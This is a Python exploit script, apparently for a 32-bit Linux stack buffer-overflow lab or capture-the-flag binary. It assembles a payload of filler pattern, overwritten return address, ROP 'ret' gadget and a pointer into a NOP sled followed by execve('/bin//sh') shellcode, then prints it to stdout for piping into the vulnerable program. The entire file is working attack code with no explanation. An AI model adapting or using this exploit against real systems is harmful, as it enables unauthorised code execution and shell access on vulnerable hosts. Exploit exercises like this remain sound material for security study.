#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

#shellcode = b'\x90\x90\x90\x90\x99\x6a\x0b\x58\x60\x59\xcd\x80\x90\x31\xc0\x40\xcd\x80'
shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

popeax_popebx_ret = struct.pack('I', 0x08048380)
calleax = struct.pack('I', 0x080485eb)
ret = struct.pack('I', 0x08048383)
shellcode_pointer = struct.pack('I', 0xbffffcf0)


buf = b''
buf += create_pattern(0x13)
buf += struct.pack('I', 0xbffffc88)
buf += ret
buf += shellcode_pointer
buf += shellcode
buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
